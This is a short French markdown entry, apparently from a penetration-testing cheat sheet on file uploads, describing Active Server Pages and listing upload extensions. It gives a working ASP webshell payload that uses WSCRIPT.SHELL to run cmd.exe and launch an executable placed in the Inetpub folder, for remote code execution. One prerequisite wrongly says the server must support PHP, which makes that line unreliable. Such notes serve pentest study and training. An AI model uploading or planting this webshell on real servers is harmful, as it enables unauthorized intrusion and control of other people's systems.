# Active Server Pages

<img src="logo-asp.png" title="" alt="" height="200">

**Facteur de risque** : RCE via webshell

**Extension** : `.asp`, `.aspx`, `.cer`, `.asa`, `.cshtml`, `.vbhtml`

**Description** : **Active Server Pages** est une solution Microsoft de langage de script côté serveur, qui fonctionne avec VBScript et JScript.  Elle a été remplacé par **ASP.NET** en 2002.

## Sommaire

- RCE

## RCE

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

- Le serveur supporte le PHP

### Payload

```visual-basic
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /c c:\Inetpub\shell443.exe",0,True)
%>
```

## References

- Web shells in PHP, ASP, JSP, Perl, and ColdFusion : http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Webshells%20In%20PHP,%20ASP,%20JSP,%20Perl,%20And%20ColdFusion.pdf
- [Webshell &#xB7; Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html)

## Todo
